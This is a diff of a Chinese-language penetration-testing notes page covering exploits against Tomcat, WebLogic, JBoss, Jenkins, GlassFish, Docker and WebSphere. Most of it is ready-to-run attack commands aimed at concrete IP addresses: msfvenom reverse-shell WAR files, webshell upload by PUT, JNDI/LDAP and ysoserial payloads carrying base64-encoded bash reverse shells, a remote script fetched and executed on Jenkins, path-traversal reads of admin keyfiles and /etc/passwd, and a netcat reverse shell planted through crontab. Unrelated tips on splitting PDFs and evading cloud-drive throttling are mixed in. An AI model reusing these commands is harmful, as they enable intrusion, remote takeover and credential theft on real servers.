+<p>在 1.php 后面插入一个 \x0A (注意，不能是 \x0D\x0A，只能是一个 \x0A)，不再拦截访问刚才上传的 / 1.php%0a，发现能够成功解析，但这个文件不是 php 后缀，说明目标存<br>
 在解析漏洞</p>
+<p>（4）其他 cve</p>
+<p>此外还有 cve_2017_9798 价值不高、cve_2018_11759 价值不高等与权限无关的漏洞、cve_2021_37580 插件问题。有的 apache 和其他组件配合使用，是存在一些漏洞的，甚至可以命令执行，但是需要看当前配合的组件时哪些。</p>
+<h4 id="tomcat弱口令-上传-包含"><a class="markdownIt-Anchor" href="#tomcat弱口令-上传-包含">#</a> tomcat 弱口令 上传 包含</h4>
+<p>（1）弱口令猜解</p>
+<p>配置不当导致后台弱口令，可通过上传 jsp 压缩包改名的 war 拿 shell；tomcat 的 manager 页面存在弱口令，可用 msf 尝试爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line">set RHOSTS 192.168.31.109</span><br><span class="line">使用 msf 生成一个反弹 shell 的 war 文件木马</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST= 192.168.31.135 LPORT= 4444 -f war -o revshell.war</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者可以利用哥斯拉生成jsp的java木马，在压缩成zip最后改名为war后缀</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/BeichenDream/Godzilla</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传到tomcat后台并且访问上传的内容即可</span></span><br></pre></td></tr></table></figure>
+<p>（2）PUT 方法任意写文件漏洞</p>
+<p>Tomcat 版本 8.5.19 存在 PUT 方法任意写文件漏洞（CVE-2017-12615 ）。准备好木马文件 ice.jsp，利用 curl 命令用 PUT 方法往 1 .jsp/ 发送恶意木马文件，可得到 webshell。</p>
+<p>漏洞链接: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvdG9tY2F0L0NWRS0yMDE3">https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017</span> -12615/README.zh-cn.md</p>
+<p><code>curl -v http://110.42.178.227:8080/1.jsp/ -X PUT -d @ice.jsp</code></p>
+<p>或者通过 burp 改数据包，修改方法为 PUT，访问地址为 1.jsp/，并上传木马</p>
+<p>（3）文件包含漏洞</p>
+<p>Aapache Tomcat AJP 文件包含漏洞 (CVE-2020-1938) 由于 Tomcat AJP 协 议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。 此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远 程代码执行的危害。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载利用代码 (Tomcat 9.0.30)</span></span><br><span class="line">wget https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/archive/refs/heads/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line">cd CNVD-2020-10487-Tomcat-Ajp-lfi-master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接用脚本读取敏感文件</span></span><br><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 110.42.178.227</span><br></pre></td></tr></table></figure>
+<h4 id="weblogic-加载ldap"><a class="markdownIt-Anchor" href="#weblogic-加载ldap">#</a> weblogic 加载 ldap</h4>
+<p>探针默认端口：7001，Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。 cve_2017_3506 工具、cve_2018_2893 工具、cve_2018_3245 工具、cve_2020_1<br>
+4882 工具、cve_2021_2394 反序列化。<br>
+<strong>安全圈小王子工具 (GUI_Tools V1.1) 一把梭</strong></p>
 <ul>
-<li>需要上传，还得是黑名单验证</li>
+<li>CVE-2021-2394</li>
 </ul>
-<p>（ 4 ）其他 cve</p>
-<p>此外还有 cve_2017_9798 价值不高、cve_2018_11759 价值不高等与权限无<br>
-关的漏洞、cve_2021_37580 插件问题。有的 apache 和其他组件配合使用，是存<br>
-在一些漏洞的，甚至可以命令执行，但是需要看当前配合的组件时哪些。</p>
-<p>| pdftk 命令分隔与合并 pdf</p>
-<h1 id="谷歌翻译限制-10-m可利用此方法拆分后一一翻译在合并"><a class="markdownIt-Anchor" href="#谷歌翻译限制-10-m可利用此方法拆分后一一翻译在合并">#</a> 谷歌翻译限制 10 M，可利用此方法拆分后一一翻译在合并</h1>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装pdftk工具：</span><br><span class="line">brew install pdftk-java</span><br><span class="line">brew install openjdk@11</span><br><span class="line">拆分pdf为两个文件：</span><br><span class="line">pdftk penetrationtestingazureforethicalhackers.pdf cat 1-200 output book-1.pdf</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pdftk penetrationtestingazureforethicalhackers.pdf cat 201-352 output book-2.pdf</span><br><span class="line">将分隔后的再次合并：</span><br><span class="line">pdftk book-1.pdf book-2.pdf cat output azure-book.pdf</span><br><span class="line">pdftk A=book- 1 \(Chinese\).pdf B=book- 2 \(Chinese\).pdf cat A B output azure-book.pdf</span><br></pre></td></tr></table></figure>
-<h4 id="333-tomcat弱口令-文件上传及包含"><a class="markdownIt-Anchor" href="#333-tomcat弱口令-文件上传及包含">#</a> 3.3.3 tomcat 弱口令、文件上传及包含</h4>
-<h5 id="1-弱口令猜解"><a class="markdownIt-Anchor" href="#1-弱口令猜解">#</a> （ 1 ）弱口令猜解</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">配置不当导致后台弱口令，可通过上传 jsp 压缩包改名的 war 拿 shell；</span><br><span class="line">tomcat的manager页面存在弱口令，可用msf尝试爆破</span><br></pre></td></tr></table></figure>
-<ol start="11">
-<li>use auxiliary/scanner/http/tomcat_mgr_login</li>
-<li>set RHOSTS 192.168.31.109</li>
-<li>使用 msf 生成一个反弹 shell 的 war 文件木马</li>
-<li>msfvenom - p java/jsp_shell_reverse_tcp LHOST= 192 .168.31.135 LPORT= 4444 - f war -<br>
-o revshell.war</li>
-<li>
-<h1 id="或者可以利用哥斯拉生成jsp的java木马在压缩成zip最后改名为war后缀"><a class="markdownIt-Anchor" href="#或者可以利用哥斯拉生成jsp的java木马在压缩成zip最后改名为war后缀">#</a> 或者可以利用哥斯拉生成 jsp 的 java 木马，在压缩成 zip 最后改名为 war 后缀</h1>
-</li>
-<li>
-<h1 id="httpsgithubcombeichendreamgodzilla"><a class="markdownIt-Anchor" href="#httpsgithubcombeichendreamgodzilla">#</a> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JlaWNoZW5EcmVhbS9Hb2R6aWxsYQ==">https://github.com/BeichenDream/Godzilla</span></h1>
-</li>
-<li>上传到 tomcat 后台并且访问上传的内容即可</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">（ 2 ）PUT方法任意写文件漏洞</span><br><span class="line">Tomcat版本8.5.19 存在PUT方法任意写文件漏洞（CVE- 2017 - 12615 ）。准</span><br><span class="line">备好木马文件ice.jsp，利用curl命令用PUT方法往 1 .jsp/发送恶意木马文件，可</span><br><span class="line">得到webshell。</span><br><span class="line"># curl -v http://110.42.178.227:8080/1.jsp/ -X PUT -d @ice.jsp</span><br><span class="line">或者通过burp改数据包，修改方法为PUT，访问地址为1.jsp/，并上传木马</span><br><span class="line"># https://github.com/vulhub/vulhub/blob/master/tomcat/CVE- 2017 - 12615/README.zh-cn.md</span><br><span class="line">（ 3 ）文件包含漏洞</span><br><span class="line">Aapache Tomcat AJP 文件包含漏洞（CVE- 2020 - 1938 ）由于 Tomcat AJP 协</span><br><span class="line">议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat</span><br><span class="line">上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。</span><br><span class="line">此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远</span><br><span class="line">程代码执行的危害。</span><br></pre></td></tr></table></figure>
-<ol start="18">
-<li>
-<p>#下载利用代码 (Tomcat 9.0.30)</p>
-</li>
-<li>
-<p>wget <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1lESENVSS9DTlZELQ==">https://github.com/YDHCUI/CNVD-</span> 2020 - 10487 - Tomcat-Ajp-<br>
-lfi/archive/refs/heads/master.zip ; unzip master.zip</p>
-</li>
-<li>
-<p>cd CNVD- 2020 - 10487 - Tomcat-Ajp-lfi-master</p>
-</li>
-<li>
-<p>#直接用脚本读取敏感文件</p>
-</li>
-<li>
-<p>python2 CNVD- 2020 - 10487 - <span class="exturl" data-url="aHR0cDovL1RvbWNhdC1BanAtbGZpLnB5">Tomcat-Ajp-lfi.py</span> - p 8009 - f WEB-<br>
-INF/web.xml 110.42.178.227</p>
-</li>
-</ol>
-<h4 id="334-weblogic加载远程ldap导致rce"><a class="markdownIt-Anchor" href="#334-weblogic加载远程ldap导致rce">#</a> 3.3.4 weblogic 加载远程 ldap 导致 RCE</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">探针默认端口： 7001 ，Weblogic是 Oracle公司推出的 J2EE应用服务器。</span><br><span class="line">cve_2017_3506 工具、cve_2018_2893 工具、cve_2018_3245 工具、cve_2020_1</span><br><span class="line">4882 工具、cve_2021_2394 反序列化。</span><br><span class="line"># 安全圈小王子工具(GUI_Tools V1.1)一把梭</span><br></pre></td></tr></table></figure>
-<h5 id="cve-2021-2394"><a class="markdownIt-Anchor" href="#cve-2021-2394">#</a> CVE- 2021 - 2394</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以在未授权的情况下通过 IIOP、T3 协议对存在漏洞的 WebLogic</span><br><span class="line">Server组件进行攻击，成功利用该漏洞的攻击者可以接管WebLogic Server。 这</span><br><span class="line">是一个二次反序列化漏洞，是CVE- 2020 - 14756 和CVE- 2020 - 14825 的调用链相</span><br><span class="line">结合组成一条新的调用链来绕过weblogic黑名单列表。</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在一台公网服务器上依次执行以下命令，生成ldap并监听端口</span><br><span class="line">wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-</span><br><span class="line">Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br><span class="line">注意反弹shell的代码需要进行编码：</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/1.117.52.219/4444 0&gt;&amp;1&quot; | base64</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41Mi4yMTkvNDQ0NCAwPiYxCg==&#125;|&#123;base64,</span><br></pre></td></tr></table></figure>
+<p>攻击者可以在未授权的情况下通过 IIOP、T3 协议对存在漏洞的 WebLogic Server 组件进行攻击，成功利用该漏洞的攻击者可以接管 WebLogic Server。 这是一个二次反序列化漏洞，是 CVE-2020-14756 和 CVE-2020-14825 的调用链相 结合组成一条新的调用链来绕过 weblogic 黑名单列表。</p>
+<p>漏洞链接:<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzMwNjE5L2FydGljbGUvZGV0YWlscy8xMjAyNTQxMjQ=">https://blog.csdn.net/m0_51330619/article/details/120254124</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在一台公网服务器上依次执行以下命令，生成ldap并监听端口</span></span><br><span class="line">wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意反弹shell的代码需要进行编码</span></span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/1.117.52.219/4444 0&gt;&amp;1&quot; | base64</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41Mi4yMTkvNDQ0NCAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 1.117.52.219</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用CVE_2021_2394攻击目标weblogic并加载远程ldap</span></span><br><span class="line">wget https://github.com/lz2y/CVE-2021-2394/releases/download/2.0/CVE_2021_2394_jar.zip</span><br><span class="line">java -jar CVE_2021_2394.jar 110.42.178.227 7001 ldap://1.117.52.219:1389/4ikzlu</span><br></pre></td></tr></table></figure>
+<h4 id="jboss-弱口令-反序列化"><a class="markdownIt-Anchor" href="#jboss-弱口令-反序列化">#</a> jboss 弱口令 反序列化</h4>
 <ul>
-<li>d}|{bash,-i}&quot; -A 1.117.52.219<br>
- 利用 CVE_2021_2394 攻击目标 weblogic 并加载远程 ldap：<br>
-wget <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x6MnkvQ1ZFLQ==">https://github.com/lz2y/CVE-</span> 2021 - 2394/releases/download/2.0/CVE_2021_2394_jar.zip<br>
-java -jar CVE_2021_2394.jar 110.42.178.227 7001 ldap://1.117.52.219:1389/4ikzlu</li>
+<li>CVE-2017-12149</li>
 </ul>
-<h1 id="httpsblogcsdnnetm0_51330619articledetails120254124"><a class="markdownIt-Anchor" href="#httpsblogcsdnnetm0_51330619articledetails120254124">#</a> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMzMwNjE5L2FydGljbGUvZGV0YWlscy8xMjAyNTQxMjQ=">https://blog.csdn.net/m0_51330619/article/details/120254124</span></h1>
-<ul>
-<li>复现失败了，原因未知</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| 反弹到linux失败的可能</span><br><span class="line">腾讯云安全组端口没有开放造成的无法反弹</span><br><span class="line">linux的防火墙未关闭或没有允许端口入流量导致</span><br><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux的iptables路由规则有限制导致</span><br><span class="line">iptables -L -n</span><br><span class="line">iptables -A INPUT -p tcp --dport 4444 -j ACCEPT</span><br></pre></td></tr></table></figure>
-<h4 id="335-jboss弱口令及反序列化"><a class="markdownIt-Anchor" href="#335-jboss弱口令及反序列化">#</a> 3.3.5 jboss 弱口令及反序列化</h4>
-<h5 id="cve-2017-12149"><a class="markdownIt-Anchor" href="#cve-2017-12149">#</a> CVE- 2017 - 12149</h5>
-<p>Jboss 通常占用的端口是 1098 ， 1099 ， 4444 ， 4445 ， 8080 ， 8009 ， 8083 ，<br>
-8093 ，Red Hat JBoss Application Server 是一款基于 JavaEE 的开源应用服务器。<br>
+<p>Jboss 通常占用的端口是 1098，1099，4444，4445，8080，8009，8083， 8093，Red Hat JBoss Application Server 是一款基于 JavaEE 的开源应用服务器。<br>
 在一些 jboss 管理平台上，存在弱口令，可以尝试猜解密码或未授权。</p>
-<h1 id="httpsgithubcomvulhubvulhubtreemasterjbosscve-"><a class="markdownIt-Anchor" href="#httpsgithubcomvulhubvulhubtreemasterjbosscve-">#</a> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvdHJlZS9tYXN0ZXIvamJvc3MvQ1ZFLQ==">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-</span> 2017 - 12149</h1>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们使用bash来反弹shell，但由于Runtime.getRuntime().exec()中不能使用管道符等</span><br><span class="line">bash需要的方法，我们需要用进行一次编码。</span><br><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c</span><br><span class="line">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&#125;|&#123;b</span><br><span class="line">ase64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br><span class="line">生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly</span><br><span class="line">curl http://110.42.178.227:8080/invoker/readonly --data-binary @poc.ser</span><br></pre></td></tr></table></figure>
-<h5 id="cve-2017-7504"><a class="markdownIt-Anchor" href="#cve-2017-7504">#</a> CVE- 2017 - 7504</h5>
-<h5 id="漏洞复现过程与上差不多唯一区别在于数据发送地址"><a class="markdownIt-Anchor" href="#漏洞复现过程与上差不多唯一区别在于数据发送地址">#</a> 漏洞复现过程与上差不多，唯一区别在于数据发送地址</h5>
-<p>curl <span class="exturl" data-url="aHR0cDovLzQ3Ljk0LjIzNi4xMTc6ODA4MC9qYm9zc21xLWh0dHBpbC9IVFRQU2VydmVySUxTZXJ2bGV0">http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet</span> --data-binary @1.ser</p>
-<h4 id="336-jenkins相关漏洞"><a class="markdownIt-Anchor" href="#336-jenkins相关漏洞">#</a> 3.3.6 Jenkins 相关漏洞</h4>
-<p>探针默认端口： 8080 ，Jenkins 是一个开源软件项目，是基于 Java 开发的一<br>
-种持续集成工具，用于监控持续重复的工作。</p>
-<p>（ 1 ）cve_2017_1000353</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用条件未知，即便是JDK-1.8.0_291 版本也失效了</span><br><span class="line">wget https://github.com/vulhub/CVE- 2017 - 1000353/releases/download/1.1/CVE- 2017 -</span><br><span class="line">1000353 - 1.1-SNAPSHOT-all.jar</span><br><span class="line">java -jar CVE- 2017 - 1000353 - 1.1-SNAPSHOT-all.jar jenkins_poc.ser &quot;bash -c</span><br><span class="line">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDIuMTc4LjIyNy8zNDUxMiAwPiYx&#125;|&#123;b</span><br><span class="line">ase64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/vulhub/CVE- 2017 - 1000353/archive/refs/heads/master.zip</span><br><span class="line">python exploit.py http://110.42.178.227:8080 jenkins_poc.ser</span><br></pre></td></tr></table></figure>
-<p>（ 2 ）CVE- 2018 - 1000861</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/adamyordan/cve- 2019 - 1003000 - jenkins-rce-poc</span><br><span class="line">cat &gt; /tmp/1.txt &lt;&lt; EOF</span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/1.117.52.219/4444 0&gt;&amp;1</span><br><span class="line">EOF</span><br><span class="line">python3 -m http.server 1389</span><br><span class="line">利用脚本poc在vulhub靶场自带的启动环境中就有</span><br><span class="line">python2 poc.py http://110.42.178.227:8080/ &quot;curl -o /tmp/1.sh http://1.117.52.219: 1389 / 1 .txt&quot;</span><br><span class="line">python2 poc.py http://110.42.178.227:8080/ &quot;bash /tmp/1.sh&quot;</span><br></pre></td></tr></table></figure>
-<p>（ 3 ）cve_2019_100300</p>
-<p>需要用户帐号密码，可以进行用户名枚举与爆破的方法测试</p>
-<h1 id="httpsgithubcomadamyordancve-"><a class="markdownIt-Anchor" href="#httpsgithubcomadamyordancve-">#</a> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkYW15b3JkYW4vY3ZlLQ==">https://github.com/adamyordan/cve-</span> 2019 - 1003000 - jenkins-rce-poc</h1>
-<h4 id="337-glassfish弱口令-敏感文件读取"><a class="markdownIt-Anchor" href="#337-glassfish弱口令-敏感文件读取">#</a> 3.3.7 glassfish 弱口令、敏感文件读取</h4>
-<p>探针默认端口： 4848 ，GlassFish 是一款强健的商业兼容应用服务器</p>
-<p>CVE- 2017 - 1000028 ：可以获取到后台密码以及主机上的文件内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">读密码：</span><br><span class="line">/theme/METAINF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/con</span><br><span class="line">fig/admin-keyfile</span><br><span class="line">读windows文件：/theme/META-</span><br><span class="line">INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c</span><br><span class="line">0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</span><br><span class="line">读linux文件：/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%a</span><br><span class="line">e%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c</span><br><span class="line">0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>
-<p>| 破解网盘下载速度限制方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为浏览器下载并安装油猴插件：</span><br><span class="line">https://www.tampermonkey.net/</span><br><span class="line">为油猴插件下载网盘直链脚本：</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://greasyfork.org/zh-</span><br><span class="line">CN/scripts/418182-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%AE%80</span><br><span class="line">%E6%98%93%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B-%E7%9B%B4%E9</span><br><span class="line">%93%BE%E4%B8%8B%E8%BD%BD%E5%A4%8D%E6%B4%BB%E7%89%88</span><br><span class="line">在电脑上安装下载器：</span><br><span class="line">windows可下载IDM下载工具：https://softxm.lanzoui.com/idNdO0458y9g</span><br><span class="line">macOS可下载NDM下载工具（油小猴）：https://www.baiduyun.wiki/download.html</span><br><span class="line">IDM/NDM配置线程及UA：https://www.cnblogs.com/softxmm/p/13972678.html#idm</span><br><span class="line">网页百度网盘生成单个文件的url地址：http://pan.baidu.com/</span><br><span class="line">将url导入到IDM/NDM进行下载：下载并配置好的这两个工具之一</span><br><span class="line">* 油小猴附带有其他下载方案，但是速度受到了限制</span><br></pre></td></tr></table></figure>
-<h4 id="338-docker逃逸基础知识"><a class="markdownIt-Anchor" href="#338-docker逃逸基础知识">#</a> 3.3.8 docker 逃逸基础知识</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Docker 容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利</span><br><span class="line">用某种手段，再结合执行POC或EXP，就可以返回一个宿主机的高权限Shell，</span><br><span class="line">并拿到宿主机的root权限。它从容器中逃了出来，因此我们形象的称为Docker</span><br><span class="line">逃逸漏洞。</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断当前是在docker还是在宿主机上：</span><br><span class="line">ls -alh /.dockerenv 如果是在docker内部会有信息返回，否则提示没有此文件夹及文件</span><br><span class="line">cat /proc/1/cgroup 在docker内部显示的内容比较多，否则显示的内容比较少</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker daemon api 未授权访问漏洞: 利用方法是，我们随意启动一个容器，</span><br><span class="line">并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令</span><br><span class="line">写入crontab配置文件，进行反弹shell。 2375 端口开放，并且未授权。</span><br><span class="line"># https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce/README.zh-cn.md</span><br></pre></td></tr></table></figure>
-<ol start="23">
-<li>import docker</li>
-<li>client = docker.DockerClient(base_url=‘<span class="exturl" data-url="aHR0cDovL3lvdXItaXA6MjM3NS8=">http://your-ip:2375/</span>’)</li>
-<li>data = client.containers.run(‘alpine:latest’, r’’‘sh -<br>
-c “echo ‘* * * * * /usr/bin/nc your-ip 21 -<br>
-e /bin/sh’ &gt;&gt; /tmp/etc/crontabs/root” ‘’’, remove=True, volumes={’/etc’: {‘bind’: ’<br>
-/tmp/etc’, ‘mode’: ‘rw’}})
-<h1 id="有个疑问linux的计划任务目录结构是怎么样的"><a class="markdownIt-Anchor" href="#有个疑问linux的计划任务目录结构是怎么样的">#</a> 有个疑问，linux 的计划任务目录结构是怎么样的</h1>
-</li>
-</ol>
-<h4 id="339-websphere反序列化利用"><a class="markdownIt-Anchor" href="#339-websphere反序列化利用">#</a> 3.3.9 websphere 反序列化利用</h4>
-<p>WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快<br>
-速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰富<br>
-的编程模型中进行选择，更好地协调项目需求与编程模型功能和开发人员技能。<br>
-端口： 9080 —web (http) 应用访问端口、 9443 —web (https) 应用访问端口、<br>
-9060 — 管理后台访问端口、 9043 — 管理控制台安全端口、 8880 —SOAP 连接器<br>
-端口等等。漏洞探测在 8880 端口，后台是 9060 端口，解析是 9080 端口。</p>
-<h5 id="cve-2015-7450"><a class="markdownIt-Anchor" href="#cve-2015-7450">#</a> CVE- 2015 - 7450</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker pull iscrosales/websphere7</span><br><span class="line">docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7</span><br><span class="line">CVE- 2015 - 7450 反序列化 可命令执行直接用exp执行命令</span><br><span class="line">后台弱口令上传webshell，在6.x至7.0版本，后台登陆只需要输入admin作为用户标</span><br><span class="line">识，无需密码，即可登陆后台。其他版本可以尝试websphere 的默认密码。后台存在文</span><br><span class="line">件上传点，同tomcat一样，可用哥斯拉导出jsp后门压缩为zip后改为war，再后台上传</span><br><span 